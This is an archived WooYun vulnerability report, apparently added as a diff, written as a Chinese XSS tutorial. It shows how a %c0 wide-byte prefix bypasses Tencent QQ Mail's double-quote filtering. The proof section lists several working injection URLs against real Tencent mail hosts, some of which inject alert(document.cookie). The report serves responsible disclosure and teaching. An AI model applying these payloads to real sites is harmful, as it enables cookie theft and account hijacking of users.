@@ -1,0 +1,256 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 4. 宽字节复仇记 [QQ邮箱基本通用]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 4. 宽字节复仇记 [QQ邮箱基本通用]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-13 17:45</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-17：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-27：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-06：	细节向普通白帽子公开<br/>
+									2013-01-16：	细节向实习白帽子公开<br/>
+									2013-01-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">前面教程第2节，说到了输出在&lt;script&gt;..&lt;/script&gt;之间的情况。也说到了后面会再继续一些有意思的例子。 <br />
+<br />
+实际上，我们碰到的往往不是那么好。很多情况下，程序员都是会过滤的。 那么我们怎么办呢？<br />
+<br />
+“因地制宜，因材施教。” 根据漏洞的实际情况，我们可以各种绕过。 不知道这里乱用成语没啊。 惶恐不安中。<br />
+<br />
+这里先看看第一种方法，宽字节绕过。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 有一个比较经典的SQL注入，是宽字节注入。玩渗透的可能对这个都比较清楚。<br />
+<br />
+2. 有时候，宽字节确实可以带来奇效～～下面我们看腾讯的一个例子。<br />
+<br />
+3. 例子如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%22;alert(1);//aaaaaa</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们尝试注入 &quot; 来闭合前面的双引号，但是很悲剧的是，双引号被过滤了。。<br />
+<br />
+<br />
+<br />
+如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/131722122587ad10a76b4e44d6cf60465e2f560f.jpg" target="_blank"><img src="../images/131722122587ad10a76b4e44d6cf60465e2f560f.jpg" alt="14.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+看到这种情况，一般人估计会放弃了吧，至少说明程序员注意到了这里，并且过滤了。<br />
+<br />
+<br />
+<br />
+然后我们可以看到编码是：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb18030&quot; /&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+gbxxxx系列的编码，那么我们尝试一下宽字节呢？<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0%22;alert(1);//aaaaaa</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看看效果：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/13172223d8944321f074c59c0d4e52b17f6a0b6a.jpg" target="_blank"><img src="../images/13172223d8944321f074c59c0d4e52b17f6a0b6a.jpg" alt="15.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+弹个窗：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1317111974419ea4c5a88b5470b8c7b029c18182.jpg" target="_blank"><img src="../images/1317111974419ea4c5a88b5470b8c7b029c18182.jpg" alt="16.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+利用宽字节，我们华丽的复仇了“腾讯对双引号的屠杀”。<br />
+<br />
+<br />
+<br />
+至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。并不是因为%22变成了 %5c%22,而 %c0吃掉了后面的%5c。 而后面这种情况，在腾讯的相关站点暂时没有发现实际案例。 如果有，欢迎大家分享。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">不一一列举了。有这个参数的基本都有问题。 <br />
+<br />
+<br />
+<br />
+http://msgopt.mail.qq.com/cgi-bin/readtemplate?sid=ktqO7DjMQcJuAABQ&amp;folderid=9&amp;page=0&amp;t=aaaa%c0%22;alert(1);//bbbbx&amp;loc=folderlist,,,9<br />
+<br />
+http://r.mail.qq.com/cgi-bin/reader_main?sid=ktqO7DjMQcJuAABQ&amp;t=aaaa%c0&quot;bbbbx&amp;source=folderlist<br />
+<br />
+https://exmail.qq.com/cgi-bin/bizmail?sid=N7fzoGwkeI8ydyRo,7&amp;action=show_user&amp;alias=zhaopin@ucanlove.com&amp;t=%c0&quot;ccccbbbbx&amp;s=showaccount<br />
+<br />
+https://exmail.qq.com/cgi-bin/loginpage?errtype=3&amp;verify=true&amp;clientuin=info&amp;t=dm_loginpage&amp;d=fartech.cn&amp;s=&amp;alias=&amp;regalias=&amp;delegate_url=&amp;title=&amp;url=%2Fcgi-bin%2Flogin%3F&amp;org_fun=&amp;aliastype=other&amp;ss=&amp;from=&amp;autologin=n&amp;param=&amp;sp=&amp;r=b63f6de34c24eeb8a3099ab4bbfc1b8d&amp;ppp=&amp;secpp=%c0%22onmousebbbb=alert(document.cookie);//&amp;dmtype=bizmail<br />
+<br />
+http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&amp;t=%c0&quot;ccccbbbbx<br />
+<br />
+http://open.mail.qq.com/cgi-bin/communication?sid=,2,zh_CN&amp;t=%c0&quot;ccccbbbbx&amp;action=<br />
+<br />
+http://open.mail.qq.com/cgi-bin/feedback_loop?sid=,2,zh_CN&amp;check=false&amp;t=%c0&quot;ccccbbbbx&amp;action=<br />
+<br />
+http://exmail.qq.com/cgi-bin/viewdocument?sid=H6Mg9z5XNfqsfhdH,7&amp;filename=%CC%EC%BD%F2%BB%C6%BD%F0%C8%D5%D6%DC%C6%C00917.doc&amp;mailid=ZL2017-RfnEvncOeLfhJ04eTPrSU29&amp;retry=true&amp;t=%c0%22ccccbbbbx&amp;ef=qfunc<br />
+<br />
+http://reader.qq.com/cgi-bin/rss_main?sid=MTOtOYwpx56MMzN9&amp;t=aaaa%c0%22;alert(document.cookie);//bbbbx&amp;s=mag&amp;r=222&amp;init=true&amp;update=1 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">修复相关过滤机制。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-015969" title="[腾讯实例教程] 那些年我们一起学XSS - 4. 宽字节复仇记 [QQ邮箱基本通用]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-12-17 14:49</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="15969";
+var bugRating="2";
+var myRating="";
+var ratingCount="4";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
